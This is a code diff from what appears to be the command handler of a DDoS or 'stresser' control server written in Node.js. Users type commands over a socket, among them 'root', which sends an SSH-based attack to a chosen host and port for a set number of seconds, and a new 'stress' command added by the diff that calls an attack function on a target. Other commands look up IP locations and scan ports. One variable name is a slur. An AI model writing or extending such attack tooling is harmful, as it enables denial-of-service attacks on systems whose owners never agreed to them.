@@ -78,9 +78,12 @@ Server.Server.on('connection', async function(socket) {
             socket.write(Banner.ModifyBanner("help"));
         } else if(cleanSTR.startsWith("geo")) {
             socket.write(await Extra.GeoIP(Current.CurrentCmd.arg[1]));
-        } else if(cleanSTR.startsWith("root")) {
+        } else if(cleanSTR.startsWith("root")) { 
             let lul = roots.SendSSHCmd(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4])
             socket.write("            Attack sent to: " + Current.CurrentCmd.arg[1] + ":" + Current.CurrentCmd.arg[2] + " for " + Current.CurrentCmd.arg[3] + " seconds with " + Current.CurrentCmd.arg[4] + "\r\n");
+        } else if(cleanSTR.startsWith("stress")) {
+            let gay = await Extra.send_attack(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4], "root");
+            socket.write(gay);
         } else if(cleanSTR.startsWith("scan")) {
             socket.write(await Extra.pScan(Current.CurrentCmd.arg[1]));
         } else if(cleanSTR.startsWith("attack")) {
